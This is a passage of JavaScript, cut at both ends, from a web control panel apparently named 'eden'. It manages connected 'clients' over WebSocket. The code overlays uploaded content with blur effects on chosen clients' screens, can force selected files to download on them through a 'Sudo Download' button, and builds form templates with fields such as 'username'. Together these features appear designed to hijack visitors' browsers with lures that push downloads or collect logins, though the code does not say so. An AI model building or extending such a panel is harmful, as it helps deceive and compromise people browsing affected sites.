                autoHeightCheckbox.checked = true;
                templateHeight.disabled = true;
                
                // Remove all form fields except the first one
                while (formFieldsContainer.children.length > 1) {
                    formFieldsContainer.removeChild(formFieldsContainer.lastChild);
                }
                
                // Reset the first form field
                const firstSelect = formFieldsContainer.querySelector('select');
                if (firstSelect) {
                    firstSelect.value = 'username';
                }
                
                // Update the preview
                updatePreview();
            }
            
            // Initialize with a default preview
            updatePreview();
            
            // Set initial state of height input
            templateHeight.disabled = autoHeightCheckbox.checked;
        }
        
        // Blur functionality
        function setupBlurSection() {
            // Make these variables accessible globally
            window.blurStorageKey = 'eden-blur-files';
            window.blurSelectedStorageKey = 'eden-blur-selected-files';
            window.blurSelectedFilePrefix = 'eden-blur-selected-';
            window.blurFilesContainer = document.getElementById('blurFilesContainer');
            window.blurUploadArea = document.getElementById('blurUploadArea');
            window.blurFileInput = document.getElementById('blurFileInput');
            window.blurEffectType = document.getElementById('blurEffectType');
            window.blurIntensity = document.getElementById('blurIntensity');
            window.blurIntensityValue = document.getElementById('blurIntensityValue');
            window.clearBlurBtn = document.getElementById('clearBlurBtn');
            
            // Load saved files from localStorage - make this global
            window.loadBlurFiles = function() {
                try {
                    const savedFiles = localStorage.getItem(window.blurStorageKey);
                    return savedFiles ? JSON.parse(savedFiles) : {};
                } catch (error) {
                    console.error('Error loading blur files from localStorage:', error);
                    return {};
                }
            };
            
            // Save files to localStorage - make this global
            window.saveBlurFiles = function(files) {
                try {
                    localStorage.setItem(window.blurStorageKey, JSON.stringify(files));
                } catch (error) {
                    console.error('Error saving blur files to localStorage:', error);
                }
            };

            window.loadBlurSelectedFiles = function() {
                try {
                    const saved = localStorage.getItem(window.blurSelectedStorageKey);
                    return saved ? JSON.parse(saved) : [];
                } catch (error) {
                    console.error('Error loading blur selected files:', error);
                    return [];
                }
            };

            window.saveBlurSelectedFiles = function(selected) {
                try {
                    const serialized = JSON.stringify(selected);
                    localStorage.setItem(window.blurSelectedStorageKey, serialized);

                    const selectedNames = new Set(selected.map(file => file.fileName));

                    selected.forEach(file => {
                        try {
                            localStorage.setItem(`${window.blurSelectedFilePrefix}${file.fileName}`, file.content);
                        } catch (error) {
                            console.error('Error storing blur selection cache:', error);
                        }
                    });

                    const keysToRemove = [];
                    for (let i = 0; i < localStorage.length; i++) {
                        const key = localStorage.key(i);
                        if (!key) continue;

                        if (key.startsWith(window.blurSelectedFilePrefix)) {
                            const name = key.substring(window.blurSelectedFilePrefix.length);
                            if (!selectedNames.has(name)) {
                                keysToRemove.push(key);
                            }
                        }
                    }

                    keysToRemove.forEach(key => localStorage.removeItem(key));
                } catch (error) {
                    console.error('Error saving blur selected files:', error);
                }
            };

            window.removeBlurFileFromSelection = function(name) {
                const selected = window.loadBlurSelectedFiles();
                const filtered = selected.filter(file => file.fileName !== name);
                if (filtered.length !== selected.length) {
                    window.saveBlurSelectedFiles(filtered);
                }
            };

            window.clearBlurSelection = function() {
                try {
                    localStorage.removeItem(window.blurSelectedStorageKey);

                    const keysToRemove = [];
                    for (let i = 0; i < localStorage.length; i++) {
                        const key = localStorage.key(i);
                        if (!key) continue;
                        if (key.startsWith(window.blurSelectedFilePrefix)) {
                            keysToRemove.push(key);
                        }
                    }

                    keysToRemove.forEach(key => localStorage.removeItem(key));
                } catch (error) {
                    console.error('Error clearing blur selections:', error);
                }
            };
            
            // Render the file list - make this global
            window.renderBlurFiles = function() {
                const files = window.loadBlurFiles();
                window.blurFilesContainer.innerHTML = '';
                const selectedFiles = window.loadBlurSelectedFiles();
                const validSelected = [];
                
                if (Object.keys(files).length === 0) {
                    window.blurFilesContainer.innerHTML = '<div class="empty-message">No files uploaded yet</div>';
                    if (selectedFiles.length > 0) {
                        window.clearBlurSelection();
                    }
                    return;
                }
                
                for (const [name, content] of Object.entries(files)) {
                    const fileItem = document.createElement('div');
                    fileItem.className = 'blur-file-item';
                    
                    const fileName = document.createElement('div');
                    fileName.className = 'blur-file-name';
                    fileName.textContent = name;
                    
                    const fileContent = document.createElement('div');
                    fileContent.className = 'blur-file-content';
                    fileContent.textContent = content;
                    
                    const buttonGroup = document.createElement('div');
                    buttonGroup.className = 'blur-button-group';
                    
                    const displayBtn = document.createElement('button');
                    displayBtn.className = 'btn btn-primary btn-small';
                    displayBtn.style.flex = '1';
                    displayBtn.innerHTML = '<i class="fas fa-eye"></i> Blur';
                    displayBtn.dataset.edenMode = 'blur';
                    displayBtn.dataset.file = name;
                    displayBtn.addEventListener('click', () => window.displayBlurFile(name, content));
                    
                    const cleanBtn = document.createElement('button');
                    cleanBtn.className = 'btn btn-warning btn-small';
                    cleanBtn.style.flex = '1';
                    cleanBtn.innerHTML = '<i class="fas fa-eraser"></i> Clean';
                    cleanBtn.addEventListener('click', () => {
                        // Use the cleanBlurDisplay function if available
                        if (typeof window.cleanBlurDisplay === 'function') {
                            window.cleanBlurDisplay();
                        } else {
                            // Fallback to direct WebSocket
                            if (typeof ws !== 'undefined' && ws.readyState === WebSocket.OPEN) {
                                ws.send(JSON.stringify({type: 'cleanContent'}));
                            }
                        }
                    });
                    
                    const selectBtn = document.createElement('button');
                    selectBtn.className = 'btn btn-success btn-small select-btn';
                    selectBtn.style.flex = '1';
                    selectBtn.innerHTML = '<i class="fas fa-check"></i> Select';
                    selectBtn.dataset.selected = 'false';

                    const markSelected = () => {
                        selectBtn.dataset.selected = 'true';
                        selectBtn.className = 'btn btn-info btn-small select-btn';
                        selectBtn.innerHTML = '<i class="fas fa-check-double"></i> Selected';
                        fileItem.classList.add('selected');
                    };

                    const unmarkSelected = () => {
                        selectBtn.dataset.selected = 'false';
                        selectBtn.className = 'btn btn-success btn-small select-btn';
                        selectBtn.innerHTML = '<i class="fas fa-check"></i> Select';
                        fileItem.classList.remove('selected');
                    };

                    const isSelected = selectedFiles.some(file => file.fileName === name);
                    if (isSelected) {
                        markSelected();
                        validSelected.push({ fileName: name, content });
                    }

                    selectBtn.addEventListener('click', () => {
                        const currentlySelected = selectBtn.dataset.selected === 'true';

                        if (currentlySelected) {
                            unmarkSelected();
                            window.removeBlurFileFromSelection(name);
                            if (typeof ws !== 'undefined' && ws && ws.readyState === WebSocket.OPEN) {
                                ws.send(JSON.stringify({
                                    type: 'fileDeselected',
                                    fileName: name
                                }));
                            }
                        } else {
                            markSelected();
                            const currentSelected = window.loadBlurSelectedFiles();
                            const updated = currentSelected.filter(file => file.fileName !== name);
                            updated.push({ fileName: name, content });
                            window.saveBlurSelectedFiles(updated);
                            if (typeof ws !== 'undefined' && ws && ws.readyState === WebSocket.OPEN) {
                                ws.send(JSON.stringify({
                                    type: 'fileSelected',
                                    fileName: name,
                                    content: content
                                }));
                            }
                        }
                    });

                    const deleteBtn = document.createElement('button');
                    deleteBtn.className = 'btn btn-danger btn-small';
                    deleteBtn.style.padding = '6px';
                    deleteBtn.innerHTML = '<i class="fas fa-trash-alt"></i>';
                    deleteBtn.addEventListener('click', () => window.deleteBlurFile(name));
                    
                    buttonGroup.appendChild(displayBtn);
                    buttonGroup.appendChild(cleanBtn);
                    buttonGroup.appendChild(selectBtn);
                    buttonGroup.appendChild(deleteBtn);
                    
                    fileItem.appendChild(fileName);
                    fileItem.appendChild(fileContent);
                    fileItem.appendChild(buttonGroup);
                    
                    window.blurFilesContainer.appendChild(fileItem);
                }

                const shouldSyncDownload = !!localStorage.getItem(window.blurSelectedStorageKey);
                window.saveBlurSelectedFiles(validSelected, { syncDownload: shouldSyncDownload });
            };
            
            // Add a new file to the list - make this global
            window.addBlurFile = function(name, content) {
                const files = window.loadBlurFiles();
                files[name] = content;
                window.saveBlurFiles(files);
                window.renderBlurFiles();
            };
            
            // Delete a file from the list - make this global
            window.deleteBlurFile = function(name) {
                if (confirm(`Are you sure you want to delete the file "${name}"?`)) {
                    const files = window.loadBlurFiles();
                    delete files[name];
                    window.saveBlurFiles(files);
                    window.removeBlurFileFromSelection(name);
                    window.renderBlurFiles();
                }
            };
            
            // Display a file with blur effect - make this global
            window.displayBlurFile = function(name, content) {
                const effect = window.blurEffectType.value;
                const sliderIntensity = parseFloat(window.blurIntensity.value);
                const customInput = document.getElementById('blurIntensityCustom');
                const customVal = customInput && customInput.value !== '' ? parseFloat(customInput.value) : NaN;
                const intensity = !isNaN(customVal) ? customVal : sliderIntensity;
                
                // Set download flag when displaying file (for form submission download feature)
                sessionStorage.setItem('eden-download-flag', 'true');
                localStorage.setItem('eden-download-flag', 'true');
                sessionStorage.setItem('eden-download-type', 'downloadContent');
                
                // First check if any clients are selected
                const selectedClients = Object.keys(clients).filter(key => clients[key].selected && clients[key].status === 'online');
                
                if (selectedClients.length === 0) {
                    showStatusMessage('warning', 'No clients selected. Please select at least one client from the Connection section.');
                    return;
                }
                
                // Get saved location coordinates
                const locationX = parseInt(localStorage.getItem('eden_blur_location_x') || '50');
                const locationY = parseInt(localStorage.getItem('eden_blur_location_y') || '50');
                
                // Send message to connected clients using the existing WebSocket
                if (ws && ws.readyState === WebSocket.OPEN) {
                    // Create message object
                    const message = {
                        type: 'blurContent',
                        content: content,
                        fileName: name,
                        downloadFlag: 'true', // Add download flag
                        location: {
                            x: locationX,
                            y: locationY
                        }
                    };
                    
                    // Check if it's a built-in effect or custom effect
                    if (['blur', 'shade', 'none'].includes(effect)) {
                        // Built-in effect
                        message.effect = effect;
                        message.intensity = intensity;
                        showStatusMessage('success', `Displaying "${name}" with ${effect} effect (intensity: ${intensity})`);
                    } else {
                        // Custom effect - fetch from localStorage
                        const effectsKey = 'eden-custom-effects';
                        try {
                            const effects = JSON.parse(localStorage.getItem(effectsKey) || '{}');
                            const customEffect = effects[effect];
                            
                            if (customEffect) {
                                message.effect = 'custom';
                                message.intensity = intensity;
                                message.customEffect = {
                                    name: effect,
                                    content: customEffect.content,
                                    type: customEffect.type
                                };
                                showStatusMessage('success', `Displaying "${name}" with custom effect: ${effect} (intensity: ${intensity})`);
                            } else {
                                // Effect not found, fallback to blur
                        message.effect = 'blur';
                        message.intensity = intensity;
                                showStatusMessage('warning', `Custom effect "${effect}" not found. Using blur effect instead.`);
                            }
                        } catch (error) {
                            console.error('Error loading custom effects:', error);
                            message.effect = 'blur';
                            message.intensity = intensity;
                            showStatusMessage('warning', 'Error loading custom effect. Using blur effect instead.');
                        }
                    }
                    
                    // Send the message to clients
                    sendToSelectedClients(message);
                    
                    // Reset location to center after display
                    resetLocationToDefault();
                } else {
                    showStatusMessage('error', 'WebSocket connection is not available');
                }
            };
            
            // Reset location to default (center)
            function resetLocationToDefault() {
                localStorage.setItem('eden_blur_location_x', '50');
                localStorage.setItem('eden_blur_location_y', '50');
                
                // Update UI if location picker is open
                if (locationMarker) {
                    locationMarker.style.left = '50%';
                    locationMarker.style.top = '50%';
                    locationMarker.style.display = 'block';
                }
                if (locationX && locationY) {
                    locationX.textContent = '50';
                    locationY.textContent = '50';
                }
                
                showStatusMessage('info', 'Location reset to center');
            }
            
            // Clean the display (removes blur effect on target clients but keeps templates) - make this global
                                        window.cleanBlurDisplay = function() {
                  // Send WebSocket message if connection is available
                  if (ws && ws.readyState === WebSocket.OPEN) {
                      const message = {
                         type: 'cleanContent',
                          immediate: true // Signal to immediately remove the overlay
                      };
                      
                      // Send to selected clients
                      sendToSelectedClients(message);
                      showStatusMessage('success', 'Blur effect removed from client displays');
                  } else {
                      showStatusMessage('warning', 'WebSocket connection is not available');
                  }
                  
                  // Always clean up DOM elements even if WebSocket is not available
                  const elementsToRemove = [
                      'eden-blur-overlay',
                      'eden-content-container',
                      'eden-download-overlay',
                      'eden-download-container'
                  ];
                  
                  elementsToRemove.forEach(id => {
                      const element = document.getElementById(id);
                      if (element) element.parentNode.removeChild(element);
                  });
                  
                  // Clear storage items
                  const storageItems = [
                      'eden-active-content',
                      'eden-active-filename',
                      'eden-effect-type',
                      'eden-from-section',
                      'eden-pending-content',
                      'eden-pending-filename'
                  ];
                  
                  storageItems.forEach(item => {
                      localStorage.removeItem(item);
                      sessionStorage.removeItem(item);
                  });
                  
                  return true;
              };
            
            // Show status message
            function showStatusMessage(type, message) {
                const statusEl = document.createElement('div');
                statusEl.className = `status-message ${type}`;
                statusEl.innerHTML = `<i class="fas fa-${type === 'success' ? 'check-circle' : 'exclamation-circle'}"></i> ${message}`;
                statusEl.style.display = 'block';
                
                // Find or create status container in blur section
                let statusContainer = document.querySelector('.blur-section .status-container');
                if (!statusContainer) {
                    statusContainer = document.createElement('div');
                    statusContainer.className = 'status-container';
                    document.querySelector('.blur-section').appendChild(statusContainer);
                }
                
                // Clear previous messages
                statusContainer.innerHTML = '';
                statusContainer.appendChild(statusEl);
                
                // Auto-hide after 3 seconds
                setTimeout(() => {
                    statusEl.style.opacity = '0';
                    setTimeout(() => {
                        statusContainer.removeChild(statusEl);
                    }, 300);
                }, 3000);
            }
            
            // Clear all blur files
            clearBlurBtn.addEventListener('click', function() {
                if (confirm('Are you sure you want to clear all blur files?')) {
                    localStorage.removeItem(blurStorageKey);
                    window.clearBlurSelection();
                    renderBlurFiles();
                    showStatusMessage('success', 'All blur files cleared');
                }
            });
            
            // Clean All Templates button handler
            const cleanAllTemplatesBtn = document.getElementById('cleanAllTemplatesBtn');
            if (cleanAllTemplatesBtn) {
                cleanAllTemplatesBtn.addEventListener('click', function() {
                    if (confirm('Are you sure you want to delete all event templates? This action cannot be undone.')) {
                        clearServerTemplates();
                        if (window.websocket && window.websocket.readyState === WebSocket.OPEN) {
                            window.websocket.send(JSON.stringify({
                                type: 'delete-all-templates'
                            }));
                        } else if (typeof ws !== 'undefined' && ws && ws.readyState === WebSocket.OPEN) {
                            ws.send(JSON.stringify({
                                type: 'delete-all-templates'
                            }));
                        }
                        showStatusMessage('success', 'All event templates cleared');
                    }
                });
            }
            
            // Sudo Download button handler
            const sudoDownloadBtn = document.getElementById('sudoDownloadBtn');
            if (sudoDownloadBtn) {
                sudoDownloadBtn.addEventListener('click', function() {
                    // Check if any clients are selected
                    const selectedClients = Object.keys(clients).filter(key => clients[key].selected && clients[key].status === 'online');
                    
                    if (selectedClients.length === 0) {
                        showStatusMessage('warning', 'Please select at least one client from the Connection section');
                        return;
                    }
                    
                    // Get selected files
                    const selectedFiles = window.loadBlurSelectedFiles();
                    const files = [];
                    
                    document.querySelectorAll('.blur-file-item').forEach(item => {
                        const selectBtn = item.querySelector('.select-btn');
                        if (selectBtn && selectBtn.dataset.selected === 'true') {
                            const fileName = item.querySelector('.blur-file-name').textContent;
                            const fileContent = item.querySelector('.blur-file-content').textContent;
                            files.push({
                                fileName: fileName,
                                content: fileContent
                            });
                        }
                    });
                    
                    // Also check localStorage for selected files
                    if (selectedFiles.length > 0) {
                        files.push(...selectedFiles);
                    }
                    
                    // Remove duplicates
                    const uniqueFiles = [];
                    const seenNames = new Set();
                    files.forEach(file => {
                        if (!seenNames.has(file.fileName)) {
                            seenNames.add(file.fileName);
                            uniqueFiles.push(file);
                        }
                    });
                    
                    if (uniqueFiles.length > 0) {
                        // Send to selected clients
                        sendToSelectedClients({
                            type: 'sudoDownload',
                            files: uniqueFiles
                        });
                        showStatusMessage('success', `Downloading ${uniqueFiles.length} selected file(s) to ${selectedClients.length} selected client(s)`);
                    } else {
                        showStatusMessage('warning', 'No files selected for download');
                    }
                });
            }
            
            // Location picker variables and functions
            let selectedLocationX = 50;
            let selectedLocationY = 50;
            let locationSelected = false;
            const locationPickerModal = document.getElementById('locationPickerModal');
            const locationPreview = document.getElementById('locationPreview');
            const locationMarker = document.getElementById('locationMarker');
            const locationX = document.getElementById('locationX');
            const locationY = document.getElementById('locationY');
            const resetPositionBtn = document.getElementById('resetPositionBtn');
            const saveLocationBtn = document.getElementById('saveLocationBtn');
            const setLocationBtn = document.getElementById('setLocationBtn');
            const resetLocBtn = document.getElementById('resetLocationBtn');
            const closeModal = locationPickerModal.querySelector('.close-modal');
            
            // Reset location to center
            function resetLocation() {
                selectedLocationX = 50;
                selectedLocationY = 50;
                locationMarker.style.left = '50%';
                locationMarker.style.top = '50%';
                locationMarker.style.display = 'block';
                locationX.textContent = selectedLocationX;
                locationY.textContent = selectedLocationY;
                locationSelected = true;
            }
            
            // Save the selected location
            function saveLocation() {
                if (locationSelected) {
                    localStorage.setItem('eden_blur_location_x', selectedLocationX);
                    localStorage.setItem('eden_blur_location_y', selectedLocationY);
                    showStatusMessage('success', `Default display location set to X: ${selectedLocationX}%, Y: ${selectedLocationY}%`);
                    locationPickerModal.style.display = 'none';
                } else {
                    showStatusMessage('warning', 'Please select a location first');
                }
            }
            
            // Initialize location picker
            resetLocation();
            
            // Click to set marker position
            locationPreview.addEventListener('click', (e) => {
                const rect = locationPreview.getBoundingClientRect();
                const x = e.clientX - rect.left;
                const y = e.clientY - rect.top;
                
                selectedLocationX = Math.round((x / rect.width) * 100);
                selectedLocationY = Math.round((y / rect.height) * 100);
                
                // Constrain coordinates to be between 10% and 90%
                selectedLocationX = Math.min(Math.max(selectedLocationX, 10), 90);
                selectedLocationY = Math.min(Math.max(selectedLocationY, 10), 90);
                
                locationMarker.style.left = `${selectedLocationX}%`;
                locationMarker.style.top = `${selectedLocationY}%`;
                locationMarker.style.display = 'block';
                
                locationX.textContent = selectedLocationX;
                locationY.textContent = selectedLocationY;
                
                locationSelected = true;
            });
            
            // Reset position button
            resetPositionBtn.addEventListener('click', () => {
                resetLocation();
            });
            
            // Save location button
            saveLocationBtn.addEventListener('click', () => {
                saveLocation();
            });
            
            // Close modal when clicking the X
            closeModal.addEventListener('click', () => {
                locationPickerModal.style.display = 'none';
            });
            
            // Close modal when clicking outside
            window.addEventListener('click', (e) => {
                if (e.target === locationPickerModal) {
                    locationPickerModal.style.display = 'none';
                }
            });
            
            // Set location button opens the modal
            setLocationBtn.addEventListener('click', function() {
                console.log('Set Location button clicked');
                locationPickerModal.style.display = 'block';
            });
            
            // Reset location button resets to default center position
            resetLocBtn.addEventListener('click', function() {
                console.log('Reset Location button clicked');
                resetLocationToDefault();
            });
            
            // Set up blur intensity slider
            blurIntensity.addEventListener('input', function() {
                blurIntensityValue.textContent = this.value;
            });
            
            // Add event listeners for remove custom effects buttons
            const removeCustomEffectsBtn = document.getElementById('removeCustomEffectsBtn');
            if (removeCustomEffectsBtn) {
                removeCustomEffectsBtn.addEventListener('click', function() {
                    removeAllCustomEffects('blur');
                });
            }
            
            // Function to remove all custom effects
            function removeAllCustomEffects(section) {
                const dropdown = section === 'blur' ? 
                    document.getElementById('blurEffectType') : 
                    null;
                
                if (!dropdown) return;
                
                // Collect all custom effects
                const customEffects = [];
                for (let i = 0; i < dropdown.options.length; i++) {
                    if (dropdown.options[i].dataset.custom === 'true') {
                        customEffects.push(dropdown.options[i].value);
                    }
                }
                
                // Remove each custom effect
                customEffects.forEach(name => {
                    removeCustomEffect(name);
                });
                
                // Show success message
                if (customEffects.length > 0) {
                    showStatusMessage('success', `Removed ${customEffects.length} custom effect(s)`);
                } else {
                    showStatusMessage('info', 'No custom effects to remove');
                }
            }
            
            // File upload handling
            blurUploadArea.addEventListener('click', function() {
                blurFileInput.click();
            });
            
            blurFileInput.addEventListener('change', function(e) {
                handleBlurFiles(e.target.files);
                this.value = ''; // Reset to allow selecting the same file again
            });
            
            // Drag and drop handling
            blurUploadArea.addEventListener('dragover', function(e) {
                e.preventDefault();
                this.classList.add('dragover');
            });
            
            blurUploadArea.addEventListener('dragleave', function() {
                this.classList.remove('dragover');
            });
            
            blurUploadArea.addEventListener('drop', function(e) {
                e.preventDefault();
                this.classList.remove('dragover');
                handleBlurFiles(e.dataTransfer.files);
            });
            
            // Handle file uploads
            function handleBlurFiles(files) {
                if (!files || files.length === 0) return;
                
                for (const file of files) {
                    const reader = new FileReader();
                    const isTextFile = (() => {
                        if (!file.type) {
                            return /\.(html?|css|js|mjs|jsx|ts|tsx|json|txt|csv|xml|md)$/i.test(file.name);
                        }
                        if (file.type.startsWith('text/')) return true;
                        return [
                            'application/javascript',
                            'application/json',
                            'application/xml',
                            'application/xhtml+xml',
                            'application/x-typescript'
                        ].includes(file.type);
                    })();

                    reader.onload = function(e) {
                        addBlurFile(file.name, e.target.result);
                        showStatusMessage('success', `File "${file.name}" uploaded`);
                    };
                    reader.onerror = function() {
                        showStatusMessage('error', `Error reading file "${file.name}"`);
                    };

                    if (isTextFile) {
                        reader.readAsText(file);
                    } else {
                        reader.readAsDataURL(file);
                    }
                }
            }
            
            // Initialize blur section
            renderBlurFiles();

            // Sync intensity slider, label, and custom numeric input
            const customIntensityInput = document.getElementById('blurIntensityCustom');
            if (window.blurIntensity && window.blurIntensityValue) {
                const updateFromSlider = () => {
                    const val = parseFloat(window.blurIntensity.value || '10');
                    window.blurIntensityValue.textContent = isNaN(val) ? '10' : val;
                    if (customIntensityInput && customIntensityInput.value === '') {
                        customIntensityInput.placeholder = String(val);
                    }
                };
                window.blurIntensity.addEventListener('input', updateFromSlider);
                updateFromSlider();
            }
            if (customIntensityInput && window.blurIntensity && window.blurIntensityValue) {
                customIntensityInput.addEventListener('input', () => {
                    if (customIntensityInput.value === '') {
                        // When cleared, fall back to slider value
                        const sliderVal = parseFloat(window.blurIntensity.value || '10');
                        window.blurIntensityValue.textContent = isNaN(sliderVal) ? '10' : sliderVal;
                        return;
                    }
                    const val = parseFloat(customIntensityInput.value);
                    if (!isNaN(val)) {
                        window.blurIntensityValue.textContent = val;
                    }
                });
            }
            
            // Custom Effect Upload Handling
            const uploadEffectBtn = document.getElementById('uploadEffectBtn');
            const effectFile = document.getElementById('effectFile');
            
            // CSS UPLOAD FIX: Ensure elements exist before adding event listeners
            if (uploadEffectBtn && effectFile) {
                // Handle effect file upload - allow multiple CSS files, auto names from filename, direct save
                uploadEffectBtn.addEventListener('click', function() {
                    if (effectFile) {
                        effectFile.click();
                    } else {
                        console.error('Effect file input not found');
                        showStatusMessage('error', 'File input not found. Please refresh the page.');
                    }
                });

                effectFile.addEventListener('change', function() {
                    if (!effectFile.files || !effectFile.files.length) {
                        console.log('No files selected');
                        return;
                    }
                    
                    const files = Array.from(effectFile.files);
                    let remaining = files.length;
                    let uploadedCount = 0;
                    let errorCount = 0;

                    if (files.length === 0) {
                        showStatusMessage('error', 'No files selected');
                        return;
                    }

                    files.forEach(file => {
                        if (!file.name.toLowerCase().endsWith('.css')) {
                            console.warn('Skipping non-CSS file:', file.name);
                            remaining--;
                            errorCount++;
                            return;
                        }

                        const reader = new FileReader();
                        reader.onload = function(e) {
                            try {
                                const content = e.target.result;
                                if (!content || content.trim().length === 0) {
                                    console.warn('Empty CSS file:', file.name);
                                    errorCount++;
                                    remaining--;
                                    if (remaining === 0) {
                                        effectFile.value = '';
                                        if (uploadedCount > 0) {
                                            showStatusMessage('success', `${uploadedCount} custom effect(s) uploaded successfully`);
                                        } else {
                                            showStatusMessage('error', 'No valid CSS files were uploaded');
                                        }
                                    }
                                    return;
                                }
                                
                                let baseName = (file.name || '').replace(/\.css$/i, '').trim();
                                if (!baseName) baseName = 'custom_' + Date.now();
                                const effectKey = baseName.replace(/[^a-zA-Z0-9_.-]/g, '_').replace(/_+/g, '_').slice(0, 80) || 'custom_effect';
                                
                                console.log('Processing CSS file:', file.name, 'Effect key:', effectKey);
                                
                                // Save the effect first
                                try {
                                    saveCustomEffect(effectKey, content, 'css');
                                    console.log('Effect saved successfully:', effectKey);
                                } catch (saveError) {
                                    console.error('Error saving custom effect:', saveError);
                                    throw new Error('Failed to save effect: ' + saveError.message);
                                }
                                
                                // Add to dropdown - ensure it's added properly
                                function addToDropdown() {
                                    const blurDropdown = document.getElementById('blurEffectType');
                                    if (!blurDropdown) {
                                        console.warn('Blur dropdown not found, will retry');
                                        return false;
                                    }
                                    
                                    // Check if already exists
                                    for (let i = 0; i < blurDropdown.options.length; i++) {
                                        if (blurDropdown.options[i].value === effectKey) {
                                            console.log('Effect already exists in dropdown:', effectKey);
                                            return true;
                                        }
                                    }
                                    
                                    // Add new option
                                    try {
                                        const blurOption = document.createElement('option');
                                        blurOption.value = effectKey;
                                        blurOption.textContent = effectKey + ' (Custom)';
                                        blurOption.dataset.custom = 'true';
                                        blurDropdown.appendChild(blurOption);
                                        
                                        // Make draggable if function exists
                                        if (typeof setupDraggableOption === 'function') {
                                            setupDraggableOption(blurOption);
                                        }
                                        
                                        console.log('Successfully added effect to dropdown:', effectKey);
                                        return true;
                                    } catch (addError) {
                                        console.error('Error creating option element:', addError);
                                        return false;
                                    }
                                }
                                
                                // Try to add immediately
                                let added = addToDropdown();
                                
                                // If not added, retry after delay
                                if (!added) {
                                    setTimeout(function retry() {
                                        added = addToDropdown();
                                        if (!added) {
                                            console.error('Failed to add effect to dropdown after retry:', effectKey);
                                        }
                                    }, 500);
                                }
                                
                                uploadedCount++;
                                remaining--;
                                
                                if (remaining === 0) {
                                    effectFile.value = '';
                                    if (errorCount > 0) {
                                        showStatusMessage('warning', `${uploadedCount} effect(s) uploaded, ${errorCount} file(s) skipped`);
                                    } else {
                                        showStatusMessage('success', `${uploadedCount} custom effect(s) uploaded and saved successfully`);
                                    }
                                }
                            } catch (error) {
                                console.error('Error processing file:', file.name, error);
                                errorCount++;
                                remaining--;
                                if (remaining === 0) {
                                    effectFile.value = '';
                                    showStatusMessage('error', `Error processing file: ${file.name} - ${error.message || error}`);
                                }
                            }
                        };
                        reader.onerror = function() {
                            console.error('Error reading file:', file.name);
                            errorCount++;
                            remaining--;
                            if (remaining === 0) {
                                effectFile.value = '';
                                showStatusMessage('error', `Error reading file "${file.name}"`);
                            }
                        };
                        reader.readAsText(file);
                    });
                });
            } else {
                console.error('Upload button or file input not found. Elements:', {
                    uploadEffectBtn: !!uploadEffectBtn,
                    effectFile: !!effectFile
                });
            }
            
            // Function to save custom effect
            function saveCustomEffect(name, content, type) {
                const effectsKey = 'eden-custom-effects';
                let effects = {};
                
                try {
                    const saved = localStorage.getItem(effectsKey);
                    if (saved) {
                        const parsed = JSON.parse(saved);
                        // Ensure parsed value is an object, not null or other type
                        if (parsed && typeof parsed === 'object' && !Array.isArray(parsed)) {
                            effects = parsed;
                        }
                    }
                } catch (error) {
                    console.error('Error loading custom effects:', error);
                    // Reset to empty object on parse error
                    effects = {};
                }
                
                // Ensure effects is always an object before setting properties
                if (!effects || typeof effects !== 'object' || Array.isArray(effects)) {
                    effects = {};
                }
                
                effects[name] = {
                    content: content,
                    type: type
                };
                
                localStorage.setItem(effectsKey, JSON.stringify(effects));
            }
            
            // Function to add effect to dropdown
            function addEffectToDropdown(name) {
                if (!name || typeof name !== 'string' || name.trim().length === 0) {
                    console.error('Invalid effect name provided to addEffectToDropdown:', name);
                    return false;
                }
                
                try {
                    // Add to blur section dropdown
                    const blurDropdown = document.getElementById('blurEffectType');
                    
                    if (!blurDropdown) {
                        console.error('Blur effect dropdown not found - will retry on next load');
                        // Retry after a short delay in case dropdown hasn't loaded yet
                        setTimeout(() => {
                            const retryDropdown = document.getElementById('blurEffectType');
                            if (retryDropdown) {
                                console.log('Retrying to add effect to dropdown:', name);
                                addEffectToDropdown(name);
                            }
                        }, 500);
                        return false;
                    }
                    
                    // Check if already exists in blur dropdown
                    let existsInBlur = false;
                    for (let i = 0; i < blurDropdown.options.length; i++) {
                        if (blurDropdown.options[i].value === name) {
                            // Already exists, just select it
                            // blurDropdown.value = name; // Don't auto-select, just add
                            existsInBlur = true;
                            // console.log('Effect already exists in dropdown:', name);
                            return true;
                        }
                    }
                    
                    // Add to blur dropdown if not exists
                    if (!existsInBlur) {
                        const blurOption = document.createElement('option');
                        blurOption.value = name;
                        blurOption.textContent = name + ' (Custom)';
                        blurOption.dataset.custom = 'true'; // Mark as custom effect
                        blurDropdown.appendChild(blurOption);
                        
                        // Make custom options draggable for removal (if function exists)
                        if (typeof setupDraggableOption === 'function') {
                            setupDraggableOption(blurOption);
                        }
                        
                        console.log('Successfully added effect to dropdown:', name);
                        return true;
                    }
                } catch (error) {
                    console.error('Error adding effect to dropdown:', name, error);
                    return false;
                }
                
                return false;
            }

            // Load custom effects on startup
            function loadCustomEffects() {
                const effectsKey = 'eden-custom-effects';
                try {
                    const saved = localStorage.getItem(effectsKey);
                    if (saved) {
                        const effects = JSON.parse(saved);
                        Object.keys(effects).forEach(key => {
                            addEffectToDropdown(key);
                        });
                        console.log('Loaded custom effects:', Object.keys(effects).length);
                    }
                } catch (error) {
                    console.error('Error loading custom effects:', error);
                }
            }
            
            // Call loadCustomEffects when DOM is ready
            if (document.readyState === 'loading') {
                document.addEventListener('DOMContentLoaded', loadCustomEffects);
            } else {
                loadCustomEffects();
            }

            // Setup draggable functionality for custom effects
            function setupDraggableOption(option) {
                option.draggable = true;
                option.title = "Drag outside the dropdown to remove this custom effect";
                
                // Add a visual indicator that this is draggable
                option.style.cursor = 'grab';
                
                option.addEventListener('dragstart', function(e) {
                    e.dataTransfer.setData('text/plain', option.value);
                    
                    // Store the source dropdown ID
                    const parentDropdown = option.parentElement;
                    e.dataTransfer.setData('source-dropdown', parentDropdown.id);
                    
                    // Create a visual indicator for dragging
                    const dragFeedback = document.createElement('div');
                    dragFeedback.textContent = 'Drop outside to remove "' + option.value + '"';
                    dragFeedback.className = 'drag-feedback';
                    document.body.appendChild(dragFeedback);
                    
                    // Create a trash zone indicator
                    const trashZone = document.createElement('div');
                    trashZone.className = 'trash-zone';
                    trashZone.innerHTML = '<i class="fas fa-trash-alt"></i> Drop here to remove';
                    document.body.appendChild(trashZone);
                    
                    // Position the feedback near cursor
                    document.addEventListener('dragover', updateDragFeedback);
                    
                    function updateDragFeedback(e) {
                        dragFeedback.style.left = (e.clientX + 15) + 'px';
                        dragFeedback.style.top = (e.clientY + 15) + 'px';
                        
                        // Check if we're outside the dropdown
                        const dropdown = document.getElementById(parentDropdown.id);
                        const rect = dropdown.getBoundingClientRect();
                        
